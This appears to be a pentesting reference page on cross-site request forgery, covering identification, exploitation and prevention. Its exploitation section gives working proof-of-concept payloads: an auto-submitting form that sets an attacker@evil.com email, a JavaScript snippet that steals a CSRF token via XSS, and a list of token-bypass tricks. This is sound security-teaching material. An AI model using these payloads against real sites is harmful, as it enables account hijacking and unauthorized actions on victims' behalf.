# CSRF

## Overview

Cross-Site Request Forgery (CSRF or XSRF) is an attack that forces an authenticated user to execute unwanted actions on a web application in which they are currently authenticated. The attacker tricks the victim's browser into sending a request to the target application using the victim's credentials (typically via cookies).

The attack succeeds when:
- The application relies solely on cookies for session management (automatically sent by the browser).
- All required parameters for the sensitive action can be guessed or known by the attacker.
- There is no (or insufficient) anti-CSRF protection (tokens, same-site cookies, etc.).

## Attack Surface

- State-changing actions: profile updates, password changes, fund transfers, privilege modifications, deletions.
- Any authenticated action that can be triggered via GET or POST with predictable parameters.
- APIs and forms without proper anti-CSRF tokens or other protections.

## Identification

- Map authenticated functionality while capturing requests in a proxy.
- Identify state-changing requests (especially those using cookies for auth).
- Check for the presence and validation of anti-CSRF tokens.
- Test whether requests can be replayed or forged from an external site.
- Look for weak or predictable CSRF token generation (e.g., based on username hashes).

## Exploitation

### Basic CSRF Attack (HTML Form)

Create a malicious page that auto-submits a form:

```html
<html>
  <body>
    <form id="submitMe" action="http://target/api/update-profile" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="hidden" name="telephone" value="(227)-750-8112" />
      <input type="hidden" name="country" value="CSRF_POC" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submitMe").submit()
    </script>
  </body>
</html>
```

Serve it locally (`python -m http.server 1337`) and have the victim visit while logged into the target.

### GET-Based CSRF

Similar approach using a GET form or image tags for simple cases.

### POST-Based with Token Theft

When anti-CSRF tokens are present:
- Use reflected values or XSS to read the token from a page the victim visits.
- Example chaining (XSS + CSRF):
  ```javascript
  var req = new XMLHttpRequest();
  req.onload = handleResponse;
  req.open('get','/app/change-visibility',true);
  req.send();
  function handleResponse(d) {
      var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
      var changeReq = new XMLHttpRequest();
      changeReq.open('post', '/app/change-visibility', true);
      changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
      changeReq.send('csrf='+token+'&action=change');
  };
  ```

### Exploiting Weak CSRF Tokens

- If tokens are derived from usernames or predictable values, precompute them (e.g., MD5 of username).
- Example POC page that opens a window to refresh the token and then submits a forged request with the computed value.

### Additional Bypasses

- Submit empty or missing token values.
- Use a token from a different account if validation is insufficient.
- Change request method (POST → GET).
- Remove the token parameter entirely.
- For double-submit cookie patterns: set a known cookie value and matching parameter.
- Bypass Referer checks by manipulating the header or using meta tags: `<meta name="referrer" content="no-referrer">`
- Open redirect chaining to control where the victim is sent.

## Impact

- Unauthorised changes to user accounts or settings
- Financial transactions or transfers performed on the victim's behalf
- Privilege escalation
- Data deletion or modification
- Complete account compromise when chained with other issues

## Prevention

- Use synchronizer tokens (anti-CSRF tokens) that are unique per session and validated on every state-changing request.
- Implement SameSite cookie attributes (`Lax` or `Strict`).
- Use custom request headers for AJAX calls (browsers do not send them cross-origin by default).
- Require re-authentication for highly sensitive actions.
- Validate the Referer/Origin header as a secondary control.
- Ensure tokens are tied to the specific user/session and not reusable across accounts.

## Tools & Payloads

- Burp Suite to capture and analyse requests/tokens
- Simple HTML + JavaScript proof-of-concept pages
- Local HTTP server to host malicious pages
- MD5 or other hash libraries when testing weak token generation

**Example minimal auto-submit form:**
```html
<form action="http://target/action" method="POST">
  <input type="hidden" name="param" value="malicious-value" />
</form>
<script>document.forms[0].submit();</script>
```

See the [XSS](xss.md) page for powerful chaining opportunities and the [Broken Authentication](broken-authentication.md) page for related session issues.
